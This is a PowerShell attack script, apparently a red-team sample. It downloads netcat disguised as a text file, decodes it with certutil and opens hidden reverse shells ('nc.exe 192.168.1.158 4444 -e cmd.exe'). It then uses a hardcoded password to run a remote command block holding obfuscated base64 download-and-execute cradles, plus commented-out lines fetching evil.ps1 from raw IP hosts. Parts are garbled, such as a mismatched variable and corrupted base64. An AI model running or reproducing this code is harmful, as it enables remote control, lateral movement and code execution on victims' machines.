#example
powershell calc.exe

Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe

# -------------scanner

  $subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
    $manyips = $subnet.Length

    if($manyips -eq 2){$subnet = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop[1]}
   
    
    
    $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)

    $isdot = $subnetrange.EndsWith('.')

    if ($isdot -like "False"){$subnetrange = $subnetrange + '.'}
    
$iprange = @(1..254)



#------------end of scanner

$m = (Test-WSMan -ComputerName machine-1 -ErrorAction SilentlyContinue) 

$u = $morty
$p = "P@ssw0rd"

$atk = "192.168.1.158"

$secpassword = ConvertTo-SecureString $p -AsPlainText -Force
$mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)

$b = 0
$p = 4444
while ($b -lt 4) {

$an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSucceeded
$p++
$b++

if ($an -eq $true){

Start-Sleep -Seconds 20
Start-Process powershell "-w hidden $env:temp\nc.exe 192.168.1.158 $p -e cmd.exe"

}

}


Start-Process powershell "-w hidden $env:temp\nc.exe 192.168.1.158 4444 -e cmd.exe"

$me = $env:COMPUTERNAME

if ($m -ne $null){ Invoke-Command -ComputerName machine-1 -Credential $mycredential -ScriptBlock {powershell -nop -w hidden $a = ($nMjerh = "KABuPAoWGUAdwAtAG8AYgeRBqAGUASYwHBE0lACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAFcAbgBMAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAwAC4AMQAwAC4AMQAwAC4AMQAxADEALwBhAGQAbQBpAG4AZQB2AGkAbAAuAHAAcwAxACcAKQA=", $env:SystemRoot[4] -join '' , "E"); <# PoWerShell bitsadmin /transfer J0b /priority high https://23.3.4.2/evil.ps1 C:\teMp\evil.ps1 #>; $sAv3e = 'KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAFcAbgBMAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADkAOAAuADUALgAzAC4AMQAvAFMAdQAzAHIAZQB2AGkAbAAuAHAAcwAxACcAKQA='; $a = $a[11,12,10] -join ''; $lp = $nMjerh[4,6,7,34,22,29,32,34,36,36] -join ''; $v = (curl https://raw.githubusercontent.com/securethelogs/Powershell/master/Obsr -UseBasicParsing).content ; $l = $v[24,25,13,2,17] ; $l = $l -jOin ''; 
$nb = $v[24,0,2,15] ; $ty = $nb -jOiN '' ; pOwErShell $l $ty aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAGCBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHMAZQBjAHUAcgBlAHQAaABlAGwAbwBnAHMALwBQAG8AdwBlAHIAcwBoAGUAbABsAC8AbQBhAHMAdABlAHIALwBSAHUAUwBoAFIAMwBhAGQAeQAuAHAAcwAxACcAKQA= ; <# PoWerShell -nOp -w hidden IEX(new-object net.webclient).doWnlOadstring('httpS://12.32.5.99/eIlv.ps1') #># ; $t=0 ; $av = @(Get-Command | Where-Object {$_.name -like "get-*"}); $av = @($av.name); while($t -lt 2){$t++; $ttt = 4 ; $nO = Get-Random -max 25; powershell $av[$n0]}
}
